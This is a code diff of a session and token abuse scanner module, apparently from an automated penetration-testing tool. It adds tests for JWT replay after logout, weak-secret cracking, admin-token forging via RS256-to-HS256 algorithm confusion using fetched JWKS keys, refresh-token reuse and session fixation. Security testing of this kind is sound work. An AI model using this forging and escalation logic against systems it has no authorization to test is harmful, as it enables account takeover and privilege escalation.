@@ -8,35 +8,49 @@ Tests session-level and token-level abuse vulnerabilities on ANY target:
 - Token survives password change (CWE-613)
 - Enhanced session fixation (CWE-384)
 - XSS → Token → Privilege Escalation chain (CWE-79 + CWE-269)
+- Cookie security flags (Secure, HttpOnly, SameSite)
+- Refresh token rotation and reuse after rotation (CWE-613)
+- Refresh token validity after logout (CWE-613)
+- Concurrent sessions / multi-device session management
+- Long-lived token detection (no exp / excessive exp)
 
 All endpoint discovery is GENERIC — no target-specific hardcoding.
 Uses aiohttp directly to bypass SafeAsyncClient POST restrictions.
 
 Author: PHANTOM AI Team
-Version: 1.0.0
+Version: 2.0.0
 """
 
 from __future__ import annotations
 
+import asyncio
 import json
 import os
 import ssl
+import time
 from typing import Any, Optional
-from urllib.parse import urlparse
 
 import aiohttp
 
-from scanning.vuln_scanner import Finding, ScanModule
+from scanning.findings import Finding, VulnType, Severity
+from scanning.vuln_scanner import ScanModule
 from utils.logger import get_logger
 from utils.rate_limiter import RateLimiter
 
 logger = get_logger(__name__)
 
+# FIX SAFE-01: Safety mode check
+# Session tests use POST but are generally safe (test session mechanics, not modify data)
+# However, password change tests should be blocked in safe modes
+SAFE_MODE = os.environ.get("PHANTOM_SAFE_MODE", "safe").lower()
+ALLOW_DESTRUCTIVE_SESSION_TESTS = SAFE_MODE in ("standard", "aggressive")
+
 # Reuse JWT utilities from existing jwt_scanner
 from scanning.modules.jwt_scanner import JWTToken, JWTManipulator, WEAK_SECRETS
 
 # Reuse SharedFindingsStore for XSS chain
-from utils.shared_findings_store import SharedFindingsStore, VulnType
+from utils.shared_findings_store import SharedFindingsStore, VulnType as StoreVulnType
+from scanning.scan_context import ScanContext
 
 # ---------------------------------------------------------------------------
 # Generic endpoint lists — work on any website
@@ -74,6 +88,21 @@ GENERIC_PASSWORD_CHANGE_PATHS = [
 GENERIC_LOGIN_PATHS = [
     "/rest/user/login", "/api/login", "/api/v1/login",
     "/login", "/auth/login", "/api/auth/login", "/api/v1/auth/login",
+]
+
+# Refresh token endpoints (generic)
+GENERIC_REFRESH_PATHS = [
+    "/api/token/refresh", "/api/auth/refresh", "/api/v1/auth/refresh",
+    "/auth/refresh", "/oauth/token", "/token/refresh", "/api/refresh",
+    "/api/v1/token/refresh", "/rest/user/refresh", "/auth/token/refresh",
+    "/api/auth/token", "/api/v1/refresh", "/refresh",
+]
+
+# Active sessions endpoints (for concurrent session testing)
+GENERIC_SESSIONS_PATHS = [
+    "/api/sessions", "/api/user/sessions", "/api/v1/sessions",
+    "/api/me/sessions", "/api/account/sessions", "/api/auth/sessions",
+    "/api/v1/user/sessions", "/api/v1/auth/sessions",
 ]
 
 # Role claims in JWT payload (generic across frameworks)
@@ -124,14 +153,19 @@ _SSL_CTX = ssl.create_default_context()
 _SSL_CTX.check_hostname = False
 _SSL_CTX.verify_mode = ssl.CERT_NONE
 
-
 class SessionAbuseScanner(ScanModule):
     """Session & Token Abuse Scanner — works on any target."""
 
     name = "session_abuse"
 
-    def __init__(self, settings: Any) -> None:
-        super().__init__(settings)
+    def __init__(
+        self,
+        settings: Any,
+        *,
+        findings_store: Any = None,
+        rate_limiter: Any = None,
+    ) -> None:
+        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
         self._discovered: dict[str, tuple[str, int]] = {}  # category -> (path, status)
         self._cracked_secret: Optional[str] = None
         self._role_escalation_proved = False
@@ -143,22 +177,70 @@ class SessionAbuseScanner(ScanModule):
         rate_limiter: RateLimiter,
     ) -> dict[str, Any]:
         """Execute session & token abuse scan."""
+        
+        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
+        self._ctx = ScanContext(asset_data)
+        self._auth_headers = self._ctx.auth_headers
+
         findings: list[dict] = []
         base_url = host if host.startswith("http") else f"https://{host}"
 
         # Extract auth context
-        auth_ctx = asset_data.get("auth_context")
+        if isinstance(asset_data, dict):
+            auth_ctx = asset_data.get("auth_context")
         if not auth_ctx or not getattr(auth_ctx, "has_auth", False):
             logger.warning("[SESSION_ABUSE] No auth_context — skipping")
-            return {"vulns": findings, "info": [{"message": "No auth token available"}]}
+            # THEME-3 FIX: Record skip reason
+            if auth_ctx and hasattr(auth_ctx, 'record_skip'):
+                auth_ctx.record_skip("session_abuse_scanner", "requires_auth_token_for_session_tests")
+            return {"findings": findings, "info": [{"message": "No auth token available"}]}
+
+        # THEME-3 FIX: Record auth usage
+        if hasattr(auth_ctx, 'record_usage'):
+            auth_ctx.record_usage("session_abuse_scanner", auth_type_required="jwt")
 
         token = auth_ctx.token
         auth_headers = auth_ctx.auth_headers
+
+        # Extract user personas for cross-session testing
+        if isinstance(asset_data, dict):
+            self._user_personas = asset_data.get("user_personas")
+        if self._user_personas and self._user_personas.has_multiple_users:
+            logger.info(
+                f"[SESSION_ABUSE] Multi-user mode: {len(self._user_personas.all_contexts)} "
+                f"sessions available for cross-session testing"
+            )
 
         logger.info(
             f"[SESSION_ABUSE] Starting scan with token from {auth_ctx.method} "
             f"({auth_ctx.email})"
         )
+
+        # THEME-4: Consume cross-module data for enhanced testing
+        cross_module_tokens = []
+        cross_module_creds = []
+        chain_opportunities = []
+        try:
+            from utils.shared_findings_store import SharedFindingsStore
+            store = SharedFindingsStore.get_instance()
+
+            # Get tokens extracted by SQLi or other modules
+            cross_module_tokens = store.get_extracted_tokens("session_abuse")
+            if cross_module_tokens:
+                logger.info(f"[SESSION_ABUSE] Found {len(cross_module_tokens)} tokens from other modules")
+
+            # Get credentials for session testing
+            cross_module_creds = store.get_extracted_credentials("session_abuse")
+            if cross_module_creds:
+                logger.info(f"[SESSION_ABUSE] Found {len(cross_module_creds)} credentials from other modules")
+
+            # Get chain opportunities (XSS → session theft, etc.)
+            chain_opportunities = store.get_chain_opportunities("session_abuse")
+            if chain_opportunities:
+                logger.info(f"[SESSION_ABUSE] Found {len(chain_opportunities)} chain opportunities")
+
+        except Exception as e:
+            logger.debug(f"[SESSION_ABUSE] Cross-module data fetch failed: {e}")
 
         timeout = aiohttp.ClientTimeout(total=15)
 
@@ -166,13 +248,23 @@ class SessionAbuseScanner(ScanModule):
             # Phase 0: Discover working endpoints
             await self._discover_endpoints(session, base_url, auth_headers, rate_limiter)
 
+            # THEME-4: Test with cross-module extracted tokens
+            if cross_module_tokens:
+                try:
+                    result = await self._test_cross_module_tokens(
+                        session, base_url, cross_module_tokens, rate_limiter,
+                    )
+                    findings.extend(result)
+                except Exception as e:
+                    logger.debug(f"[SESSION_ABUSE] Cross-module token test error: {e}")
+
             # Test 1: JWT Replay After Logout
             try:
                 result = await self._test_jwt_replay_after_logout(
                     session, base_url, token, auth_headers, rate_limiter,
                 )
                 findings.extend(result)
-            except Exception as e:
+            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
                 logger.debug(f"[SESSION_ABUSE] Replay test error: {e}")
 
             # Test 2: JWT Role Escalation (crack secret + forge admin token)
@@ -181,7 +273,7 @@ class SessionAbuseScanner(ScanModule):
                     session, base_url, token, rate_limiter,
                 )
                 findings.extend(result)
-            except Exception as e:
+            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError, KeyError) as e:
                 logger.debug(f"[SESSION_ABUSE] Role escalation error: {e}")
 
             # Test 3: Logout Bypass (fresh session verification)
@@ -190,7 +282,7 @@ class SessionAbuseScanner(ScanModule):
                     base_url, token, rate_limiter,
                 )
                 findings.extend(result)
-            except Exception as e:
+            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                 logger.debug(f"[SESSION_ABUSE] Logout bypass error: {e}")
 
             # Test 4: Token Survives Password Change
@@ -199,7 +291,7 @@ class SessionAbuseScanner(ScanModule):
                     session, base_url, token, auth_ctx, rate_limiter,
                 )
                 findings.extend(result)
-            except Exception as e:
+            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
                 logger.debug(f"[SESSION_ABUSE] Password change test error: {e}")
 
             # Test 5: Enhanced Session Fixation
@@ -208,7 +300,7 @@ class SessionAbuseScanner(ScanModule):
                     session, base_url, auth_ctx, rate_limiter,
                 )
                 findings.extend(result)
-            except Exception as e:
+            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                 logger.debug(f"[SESSION_ABUSE] Session fixation error: {e}")
 
             # Test 6: XSS → Token → Privilege Escalation Chain
@@ -217,11 +309,87 @@ class SessionAbuseScanner(ScanModule):
                     base_url, token, findings,
                 )
                 findings.extend(result)
-            except Exception as e:
+            except (ValueError, KeyError, TypeError) as e:
                 logger.debug(f"[SESSION_ABUSE] XSS chain error: {e}")
 
+            # Test 7: Cookie Security Flags (Secure, HttpOnly, SameSite)
+            try:
+                result = await self._test_cookie_security_flags(
+                    session, base_url, rate_limiter,
+                )
+                findings.extend(result)
+            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                logger.debug(f"[SESSION_ABUSE] Cookie flags error: {e}")
+
+            # Test 8: Refresh Token Rotation & Reuse
+            try:
+                result = await self._test_refresh_token_abuse(
+                    session, base_url, auth_ctx, rate_limiter,
+                )
+                findings.extend(result)
+            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
+                logger.debug(f"[SESSION_ABUSE] Refresh token error: {e}")
+
+            # Test 9: Concurrent Sessions / Multi-Device Logout
+            try:
+                result = await self._test_concurrent_sessions(
+                    session, base_url, auth_ctx, rate_limiter,
+                )
+                findings.extend(result)
+            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
+                logger.debug(f"[SESSION_ABUSE] Concurrent session error: {e}")
+
+            # Test 10: Long-Lived Token Detection
+            try:
+                result = self._test_long_lived_token(token, base_url)
+                findings.extend(result)
+            except Exception as e:
+                logger.debug(f"[SESSION_ABUSE] Long-lived token check error: {e}")
+
+            # Test 11: Cross-Session Token Confusion (requires multi-user)
+            if hasattr(self, '_user_personas') and self._user_personas and self._user_personas.has_multiple_users:
+                try:
+                    result = await self._test_cross_session_confusion(
+                        session, base_url, rate_limiter,
+                    )
+                    findings.extend(result)
+                except Exception as e:
+                    logger.debug(f"[SESSION_ABUSE] Cross-session confusion error: {e}")
+
         logger.info(f"[SESSION_ABUSE] Scan complete: {len(findings)} findings")
-        return {"vulns": findings, "info": []}
+
+        # ====================================================================
+        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
+        # Chain engine can use session vulns to escalate XSS/IDOR findings
+        # ====================================================================
+        try:
+            store = SharedFindingsStore.get_instance()
+            for f in findings:
+                metadata = f.get("metadata", {}) if isinstance(f, dict) else {}
+                
+                endpoint = f.get("matched_at") or metadata.get("url", base_url)
+                subtype = metadata.get("weakness_type", "")
+                token_type = metadata.get("token_type", "jwt")
+                
+                await store.add_finding(
+                    {
+                        "type": VulnType.SESSION_ABUSE,
+                        "endpoint": endpoint,
+                        "severity": f.get("severity", "HIGH"),
+                        "name": f.get("name", "session_abuse"),
+                        "subtype": subtype,
+                        "token_type": token_type,
+                    },
+                    module="session_abuse",
+                )
+
+            if findings:
+                logger.debug(f"[SESSION_ABUSE] Shared {len(findings)} findings to cross-module store")
+        except Exception as e:
+            logger.debug(f"[SESSION_ABUSE] Could not share findings: {e}")
+
+        return {"findings": findings, "info": []}
+
 
     # ------------------------------------------------------------------
     # Phase 0: Generic Endpoint Discovery
@@ -286,7 +454,7 @@ class SessionAbuseScanner(ScanModule):
                     async with session.post(url, headers=headers, ssl=_SSL_CTX) as resp:
                         if resp.status in accept_statuses:
                             return (path, resp.status)
-            except Exception:
+            except (aiohttp.ClientError, asyncio.TimeoutError):
                 continue
         return None
 
@@ -311,7 +479,7 @@ class SessionAbuseScanner(ScanModule):
                         if "json" in ct:
                             return (path, resp.status)
                         # Skip HTML responses (SPA fallback)
-            except Exception:
+            except (aiohttp.ClientError, asyncio.TimeoutError):
                 continue
         return None
 
@@ -337,20 +505,27 @@ class SessionAbuseScanner(ScanModule):
         whoami_path, _ = whoami
         whoami_url = f"{base_url}{whoami_path}"
 
-        # Step 1: Verify token works pre-logout
+        # Step 1: Verify token works pre-logout and capture user identity
         await rate_limiter.acquire()
         async with session.get(whoami_url, headers=auth_headers, ssl=_SSL_CTX) as resp:
             if resp.status != 200:
                 return findings
             try:
                 pre_data = await resp.json()
-            except Exception:
+                pre_body = json.dumps(pre_data)
+            except (json.JSONDecodeError, aiohttp.ContentTypeError):
                 pre_data = {}
+                pre_body = ""
+
+        # Extract user identifier from pre-logout response for comparison
+        pre_user_id = self._extract_user_id(pre_data)
 
         # Step 2: Call logout endpoint
         logout = self._discovered.get("logout")
         logout_found = False
         logout_path = None
+        logout_response_hint = ""
+
         if logout:
             logout_path, _ = logout
             await rate_limiter.acquire()
@@ -360,8 +535,19 @@ class SessionAbuseScanner(ScanModule):
                 ) as resp:
                     if resp.status in (200, 204, 302):
                         logout_found = True
-            except Exception:
-                pass
+                        # Check if logout response hints at actual invalidation
+                        try:
+                            logout_body = await resp.text()
+                            if any(hint in logout_body.lower() for hint in
+                                   ["logged out", "session destroyed", "token revoked",
+                                    "successfully", "invalidated"]):
+                                logout_response_hint = "Server confirmed logout"
+                        except Exception as e:
+                            # FIX 2026-02-12: Log body read error (DEBUG - expected)
+                            logger.debug(f"[Session] Logout body read error: {e}")
+            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                # FIX 2026-02-12: Log logout POST error (DEBUG - expected)
+                logger.debug(f"[Session] Logout POST error: {e}")
 
         # Also try GET on logout paths (some frameworks use GET)
         if not logout_found:
@@ -375,62 +561,106 @@ class SessionAbuseScanner(ScanModule):
                             logout_found = True
                             logout_path = path
                             break
-                except Exception:
+                except (aiohttp.ClientError, asyncio.TimeoutError):
                     continue
 
-        # Step 3: Replay token after logout
-        await rate_limiter.acquire()
-        async with session.get(whoami_url, headers=auth_headers, ssl=_SSL_CTX) as resp:
-            if resp.status == 200:
-                try:
-                    post_data = await resp.json()
-                except Exception:
-                    post_data = {}
+        # Step 3: Replay token after logout using FRESH session (no shared cookies)
+        # CRITICAL: Use DummyCookieJar to guarantee NO cookies are sent
+        # This proves JWT-only auth bypass, not cookie-based session reuse
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(
+            timeout=timeout,
+            cookie_jar=aiohttp.DummyCookieJar(),
+        ) as fresh_session:
+            await rate_limiter.acquire()
+            async with fresh_session.get(whoami_url, headers=auth_headers, ssl=_SSL_CTX) as resp:
+                if resp.status == 200:
+                    try:
+                        post_data = await resp.json()
+                    except (json.JSONDecodeError, aiohttp.ContentTypeError):
+                        post_data = {}
 
-                findings.append(Finding(
-                    type="session_abuse",
-                    name="JWT Token Valid After Logout",
-                    severity="HIGH",
-                    description=(
-                        "JWT token remains valid after logout. The server does not "
-                        "maintain a token denylist or use server-side session state. "
-                        "An attacker who obtains a JWT (via XSS, network sniffing, or "
-                        "log exposure) can replay it indefinitely until natural expiration."
-                    ),
-                    host=base_url,
-                    matched_at=whoami_url,
-                    evidence=[
-                        f"Pre-logout: GET {whoami_path} -> 200",
-                        f"Logout attempted: {logout_path or 'no endpoint found'} "
-                        f"({'success' if logout_found else 'failed/not found'})",
-                        f"Post-logout replay: GET {whoami_path} -> 200 (SAME identity)",
-                        f"Token: {token[:40]}...",
-                    ],
-                    cvss_score=7.1,
-                    cwe="CWE-613",
-                    confidence=90,
-                    remediation=(
-                        "Implement server-side token denylist (Redis/DB). On logout, "
-                        "add the token's JTI to the denylist. Validate against denylist "
-                        "on every authenticated request. Use short-lived access tokens "
-                        "(5-15 min) with refresh token rotation."
-                    ),
-                    metadata={
-                        "module": "session_abuse",
-                        "attack_type": "jwt_replay_after_logout",
-                        "logout_endpoint_found": logout_found,
-                        "logout_path": logout_path,
-                        "whoami_path": whoami_path,
-                        "token_prefix": token[:40],
-                    },
-                ).to_dict())
+                    # Verify it's the SAME user identity (not just any 200)
+                    post_user_id = self._extract_user_id(post_data)
+                    same_identity = (
+                        pre_user_id and post_user_id and pre_user_id == post_user_id
+                    )
+
+                    # Only report if:
+                    # 1. Logout endpoint was found and called successfully
+                    # 2. Same user identity confirmed before and after
+                    if not logout_found:
+                        # No logout endpoint = can't test invalidation
+                        return findings
+
+                    if not same_identity and pre_user_id:
+                        # Different identity = logout might have worked (partial)
+                        logger.debug(
+                            f"[SESSION_ABUSE] Identity changed after logout: "
+                            f"{pre_user_id} -> {post_user_id}"
+                        )
+                        return findings
+
+                    # Adjust confidence based on evidence quality
+                    confidence = 75  # Base confidence
+                    if same_identity:
+                        confidence += 10  # Same user ID confirmed
+                    if logout_response_hint:
+                        confidence += 5  # Server said it logged out
+
+                    # Check JWT exp claim for context
+                    exp_info = self._get_jwt_exp_info(token)
+
+                    findings.append(Finding(
+                        vuln_type=VulnType.SESSION_HIJACKING,
+                        name="JWT Token Valid After Logout",
+                        severity=Severity.HIGH,
+                        description=(
+                            "JWT token remains valid after logout. The server does not "
+                            "maintain a token denylist or use server-side session state. "
+                            "An attacker who obtains a JWT (via XSS, network sniffing, or "
+                            "log exposure) can replay it indefinitely until natural expiration."
+                        ),
+                        host=base_url,
+                        endpoint=whoami_url,
+                        evidence=[
+                            f"Pre-logout: GET {whoami_path} -> 200 (user: {pre_user_id or 'unknown'})",
+                            f"Logout: POST {logout_path} -> {'success' if logout_found else 'failed'}"
+                            + (f" ({logout_response_hint})" if logout_response_hint else ""),
+                            f"Post-logout replay (fresh session): GET {whoami_path} -> 200",
+                            f"Identity verified: {'SAME user' if same_identity else 'not confirmed'}",
+                            f"Token: {token[:40]}...",
+                            f"JWT exp: {exp_info}",
+                        ],
+                        cvss_score=7.1,
+                        cwe_id="CWE-613",
+                        confidence_score=min(95, max(50, confidence)),
+                        remediation=(
+                            "Implement server-side token denylist (Redis/DB). On logout, "
+                            "add the token's JTI to the denylist. Validate against denylist "
+                            "on every authenticated request. Use short-lived access tokens "
+                            "(5-15 min) with refresh token rotation."
+                        ),
+                        metadata={
+                            "module": "session_abuse",
+                            "attack_type": "jwt_replay_after_logout",
+                            "logout_endpoint_found": logout_found,
+                            "logout_path": logout_path,
+                            "whoami_path": whoami_path,
+                            "token_prefix": token[:40],
+                            "same_identity_confirmed": same_identity,
+                            "pre_user_id": pre_user_id,
+                            "post_user_id": post_user_id,
+                            "jwt_exp": exp_info,
+                        },
+                    ).to_dict())
 
         # If no logout endpoint found at all, report that too
         if not logout_found and not logout:
             findings.append(Finding(
-                type="session_abuse",
+                vuln_type=VulnType.SESSION_HIJACKING,
                 name="No Logout Endpoint Found",
-                severity="MEDIUM",
+                severity=Severity.MEDIUM,
                 description=(
                     "No functional logout endpoint was found on the target. "
                     "Without a logout mechanism, JWT tokens cannot be revoked "
@@ -438,14 +668,14 @@ class SessionAbuseScanner(ScanModule):
                     "effectively terminate their sessions."
                 ),
                 host=base_url,
-                matched_at=base_url,
+                endpoint=base_url,
                 evidence=[
                     f"Probed {len(GENERIC_LOGOUT_PATHS)} logout paths — none responded",
                     f"Token type: Bearer JWT",
                 ],
                 cvss_score=5.4,
-                cwe="CWE-613",
-                confidence=80,
+                cwe_id="CWE-613",
+                confidence_score=80,
                 remediation=(
                     "Implement a logout endpoint that adds the token to a server-side "
                     "denylist. Use short-lived access tokens with refresh token rotation."
@@ -513,7 +743,8 @@ class SessionAbuseScanner(ScanModule):
                 if JWTManipulator.verify_hmac_signature(parsed, secret):
                     cracked = secret
                     self._cracked_secret = secret
-                    logger.info(f"[SESSION_ABUSE] JWT secret cracked: '{cracked}'")
+                    # SECURITY: Don't log actual secret, only confirmation + length
+                    logger.info(f"[SESSION_ABUSE] JWT weak secret found (length={len(cracked)})")
                     break
 
             if cracked:
@@ -521,14 +752,75 @@ class SessionAbuseScanner(ScanModule):
                     return JWTManipulator.create_token(header, payload, s, a)
                 strategies.append(("weak_secret", forge_hmac))
 
-        # Strategy 3: Algorithm confusion (RS256 -> HS256 using empty/known key)
+        # Strategy 3: Algorithm confusion (RS256 -> HS256 using various keys)
+        # CVE-2016-5431: If server uses RSA public key to verify, but attacker
+        # switches to HS256, the server may use the public key as HMAC secret
         if alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS"):
-            # Try signing with empty secret as HS256
-            def forge_alg_confusion(header: dict, payload: dict) -> str:
+            # 3a: Empty secret
+            def forge_alg_confusion_empty(header: dict, payload: dict) -> str:
                 h = header.copy()
                 h["alg"] = "HS256"
                 return JWTManipulator.create_token(h, payload, "", "HS256")
-            strategies.append(("alg_confusion_empty", forge_alg_confusion))
+            strategies.append(("alg_confusion_empty", forge_alg_confusion_empty))
+
+            # 3b: Try common placeholder secrets for confusion attack
+            confusion_secrets = [
+                "secret", "key", "public", "",
+                "-----BEGIN PUBLIC KEY-----",  # Some libs use raw PEM
+            ]
+            for secret in confusion_secrets:
+                def forge_alg_confusion_secret(header: dict, payload: dict, s=secret) -> str:
+                    h = header.copy()
+                    h["alg"] = "HS256"
+                    return JWTManipulator.create_token(h, payload, s, "HS256")
+                strategies.append((f"alg_confusion_{secret[:8] or 'empty'}", forge_alg_confusion_secret))
+
+            # 3c: Try HS384 and HS512 (some libs only block HS256)
+            for hs_alg in ("HS384", "HS512"):
+                def forge_alg_other_hs(header: dict, payload: dict, a=hs_alg) -> str:
+                    h = header.copy()
+                    h["alg"] = a
+                    return JWTManipulator.create_token(h, payload, "", a)
+                strategies.append((f"alg_confusion_{hs_alg}", forge_alg_other_hs))
+
+            # 3d: Try to fetch and use public key from JWKS endpoint
+            jwks_endpoints = [
+                f"{base_url}/.well-known/jwks.json",
+                f"{base_url}/oauth/.well-known/jwks.json",
+                f"{base_url}/.well-known/openid-configuration",
+            ]
+            for jwks_url in jwks_endpoints:
+                try:
+                    jwks_resp = await session.get(jwks_url, timeout=5)
+                    if jwks_resp.status == 200:
+                        jwks_text = await jwks_resp.text()
+                        # Extract any key-like strings to use as HMAC secret
+                        import json
+                        try:
+                            jwks_data = json.loads(jwks_text)
+                            # Try using the raw JWKS as secret
+                            def forge_with_jwks(header: dict, payload: dict, k=jwks_text) -> str:
+                                h = header.copy()
+                                h["alg"] = "HS256"
+                                return JWTManipulator.create_token(h, payload, k, "HS256")
+                            strategies.append(("alg_confusion_jwks", forge_with_jwks))
+
+                            # Try using each key's 'n' value (RSA modulus)
+                            if "keys" in jwks_data:
+                                for key in jwks_data["keys"][:2]:
+                                        if "n" in key:
+                                            def forge_with_n(header: dict, payload: dict, n=key["n"]) -> str:
+                                                h = header.copy()
+                                                h["alg"] = "HS256"
+                                                return JWTManipulator.create_token(h, payload, n, "HS256")
+                                            strategies.append(("alg_confusion_pubkey_n", forge_with_n))
+                        except json.JSONDecodeError as e:
+                            # FIX 2026-02-12: Log JWKS parse error (DEBUG - expected)
+                            logger.debug(f"[Session] JWKS JSON decode error: {e}")
+                        break  # Found JWKS, stop searching
+                except Exception as e:
+                    # FIX 2026-02-12: Log JWKS fetch error (DEBUG - expected)
+                    logger.debug(f"[Session] JWKS fetch error: {e}")
 
         # Try each strategy with each role claim
         for strategy_name, forge_fn in strategies:
@@ -592,12 +884,12 @@ class SessionAbuseScanner(ScanModule):
                             )
 
                         findings.append(Finding(
-                            type="session_abuse",
+                            vuln_type=VulnType.JWT_VULNERABILITY,
                             name="Privilege Escalation via JWT Tampering",
-                            severity="CRITICAL",
+                            severity=Severity.CRITICAL,
                             description=method_desc,
                             host=base_url,
-                            matched_at=f"{base_url}{endpoint}",
+                            endpoint=f"{base_url}{endpoint}",
                             evidence=[
                                 f"Original algorithm: {alg}",
                                 f"Attack strategy: {strategy_name}",
@@ -607,8 +899,8 @@ class SessionAbuseScanner(ScanModule):
                                 f"Forged token: {forged_token[:50]}...",
                             ],
                             cvss_score=9.8,
-                            cwe="CWE-269",
-                            confidence=95,
+                            cwe_id="CWE-269",
+                            confidence_score=95,
                             remediation=remediation,
                             metadata={
                                 "module": "session_abuse",
@@ -660,7 +952,7 @@ class SessionAbuseScanner(ScanModule):
                             body = await resp.text()
                             if "json" in ct and self._is_real_data(body, path):
                                 return (path, resp.status, body[:500])
-                except Exception:
+                except (aiohttp.ClientError, asyncio.TimeoutError):
                     continue
                 continue
 
@@ -678,7 +970,7 @@ class SessionAbuseScanner(ScanModule):
                                 body = await resp.text()
                                 if "json" in ct and self._is_real_data(body, path):
                                     return (path, resp.status, body[:500])
-                except Exception:
+                except (aiohttp.ClientError, asyncio.TimeoutError):
                     continue
 
         # Strategy B: Use whoami endpoint to verify forged token is accepted
@@ -694,7 +986,7 @@ class SessionAbuseScanner(ScanModule):
                     if resp.status == 200:
                         body = await resp.text()
                         return (whoami_path, resp.status, body[:500])
-            except Exception:
+            except (aiohttp.ClientError, asyncio.TimeoutError):
                 pass
 
         return None
@@ -734,28 +1026,34 @@ class SessionAbuseScanner(ScanModule):
         auth_headers = {"Authorization": f"Bearer {token}"}
         timeout = aiohttp.ClientTimeout(total=10)
 
-        # Step 1: Fresh session — call logout
-        async with aiohttp.ClientSession(timeout=timeout) as fresh1:
+        # Step 1: Fresh session — call logout (no cookies, JWT-only auth)
+        async with aiohttp.ClientSession(
+            timeout=timeout,
+            cookie_jar=aiohttp.DummyCookieJar(),
+        ) as fresh1:
             await rate_limiter.acquire()
             try:
                 async with fresh1.post(
                     f"{base_url}{logout_path}", headers=auth_headers, ssl=_SSL_CTX,
                 ) as resp:
                     logout_status = resp.status
-            except Exception:
+            except (aiohttp.ClientError, asyncio.TimeoutError):
                 return findings
 
-        # Step 2: Completely new session — replay token
-        async with aiohttp.ClientSession(timeout=timeout) as fresh2:
+        # Step 2: Completely new session — replay token (no cookies)
+        async with aiohttp.ClientSession(
+            timeout=timeout,
+            cookie_jar=aiohttp.DummyCookieJar(),
+        ) as fresh2:
             await rate_limiter.acquire()
             async with fresh2.get(
                 f"{base_url}{whoami_path}", headers=auth_headers, ssl=_SSL_CTX,
             ) as resp:
                 if resp.status == 200:
                     findings.append(Finding(
-                        type="session_abuse",
+                        vuln_type=VulnType.SESSION_HIJACKING,
                         name="Logout Does Not Invalidate JWT Token",
-                        severity="HIGH",
+                        severity=Severity.HIGH,
                         description=(
                             "After calling the logout endpoint, the JWT token remains "
                             "valid when used from a completely new HTTP session (no "
@@ -764,15 +1062,15 @@ class SessionAbuseScanner(ScanModule):
                             "it indefinitely regardless of user logout."
                         ),
                         host=base_url,
-                        matched_at=f"{base_url}{whoami_path}",
+                        endpoint=f"{base_url}{whoami_path}",
                         evidence=[
                             f"Logout: POST {logout_path} -> {logout_status}",
                             f"Replay (fresh session): GET {whoami_path} -> 200",
                             "Token NOT invalidated server-side",
                         ],
                         cvss_score=6.5,
-                        cwe="CWE-613",
-                        confidence=85,
+                        cwe_id="CWE-613",
+                        confidence_score=85,
                         remediation=(
                             "Implement server-side token denylist. On logout, blacklist "
                             "the token's JTI claim. Check denylist on every request."
@@ -802,6 +1100,12 @@ class SessionAbuseScanner(ScanModule):
     ) -> list[dict]:
         """Test if old JWT still works after password change."""
         findings: list[dict] = []
+
+        # FIX SAFE-01: This test ACTUALLY changes password - block in safe modes
+        if not ALLOW_DESTRUCTIVE_SESSION_TESTS:
+            logger.info("⚠️ SAFE MODE: Skipping password change test (destructive)")
+            return findings
+
         whoami = self._discovered.get("whoami")
         if not whoami:
             return findings
@@ -833,7 +1137,7 @@ class SessionAbuseScanner(ScanModule):
                             pw_changed = True
                             pw_change_path = path
                             break
-                except Exception:
+                except (aiohttp.ClientError, asyncio.TimeoutError):
                     continue
             if pw_changed:
                 break
@@ -848,9 +1152,9 @@ class SessionAbuseScanner(ScanModule):
         ) as resp:
             if resp.status == 200:
                 findings.append(Finding(
-                    type="session_abuse",
+                    vuln_type=VulnType.SESSION_HIJACKING,
                     name="JWT Token Valid After Password Change",
-                    severity="HIGH",
+                    severity=Severity.HIGH,
                     description=(
                         "JWT token remains valid after password change. An attacker "
                         "who has stolen a token can continue using it even after the "
@@ -858,14 +1162,14 @@ class SessionAbuseScanner(ScanModule):
                         "invalidated upon password change."
                     ),
                     host=base_url,
-                    matched_at=f"{base_url}{whoami_path}",
+                    endpoint=f"{base_url}{whoami_path}",
                     evidence=[
                         f"Password changed: POST {pw_change_path} -> 200",
                         f"Old token replay: GET {whoami_path} -> 200 (still valid)",
                     ],
                     cvss_score=7.1,
-                    cwe="CWE-613",
-                    confidence=85,
+                    cwe_id="CWE-613",
+                    confidence_score=85,
                     remediation=(
                         "Invalidate all existing tokens when password changes. "
                         "Use a per-user token version counter or JTI denylist. "
@@ -888,7 +1192,7 @@ class SessionAbuseScanner(ScanModule):
                 ) as resp:
                     if resp.status == 200:
                         break
-            except Exception:
+            except (aiohttp.ClientError, asyncio.TimeoutError):
                 continue
 
         return findings
@@ -922,7 +1226,7 @@ class SessionAbuseScanner(ScanModule):
                             if header_val.lower().startswith(name.lower() + "="):
                                 val = header_val.split("=", 1)[1].split(";")[0]
                                 pre_cookies[name] = val
-        except Exception:
+        except (aiohttp.ClientError, asyncio.TimeoutError):
             return findings
 
         if not pre_cookies:
@@ -948,9 +1252,9 @@ class SessionAbuseScanner(ScanModule):
                                     if cookie.key.lower() == cookie_name.lower():
                                         if cookie.value == pre_value:
                                             findings.append(Finding(
-                                                type="session_abuse",
+                                                vuln_type=VulnType.SESSION_HIJACKING,
                                                 name="Session Fixation — Cookie Not Rotated After Login",
-                                                severity="HIGH",
+                                                severity=Severity.HIGH,
                                                 description=(
                                                     f"Session cookie '{cookie_name}' retains the "
                                                     f"same value before and after authentication. "
@@ -959,7 +1263,7 @@ class SessionAbuseScanner(ScanModule):
                                                     f"they authenticate."
                                                 ),
                                                 host=base_url,
-                                                matched_at=f"{base_url}{path}",
+                                                endpoint=f"{base_url}{path}",
                                                 evidence=[
                                                     f"Cookie: {cookie_name}",
                                                     f"Pre-login value: {pre_value[:40]}...",
